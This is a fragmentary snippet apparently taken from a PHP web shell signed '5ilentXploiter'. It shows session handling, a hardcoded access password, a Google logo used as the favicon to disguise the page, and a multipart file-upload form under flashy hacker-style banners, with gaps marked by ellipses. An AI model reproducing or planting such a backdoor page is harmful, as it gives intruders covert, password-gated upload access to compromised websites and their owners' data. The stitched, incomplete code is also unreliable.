...
session_start();
$pass = "258159"; // encrypt base64,md5
...
<link rel="icon" https://goodimg.io/images/2024/06/26/google-logo.png"><meta name="theme-color" content="black"> </meta> <!--Buat Thumbnail website--> 
...
<form enctype="multipart/form-data" method="post">
  <td align="center">
     <center><p class="blink_text" style="font-size:50px;color:purple;text-shadow: 0px 0px 20px #00ffff , 0px 0px 20px #DF0101;font-family:Kelly Slab;">&lt;/&gt;  !!! &lt/&gt; </font></center>
          <br>      
...
<h1><font class="Skranji" style="color:white;font-family:'Kelly Slab';font-size: 15px;">Copyright &copy; 2K20 <font color="purple">5ilentXploiter</h1>
      <br>
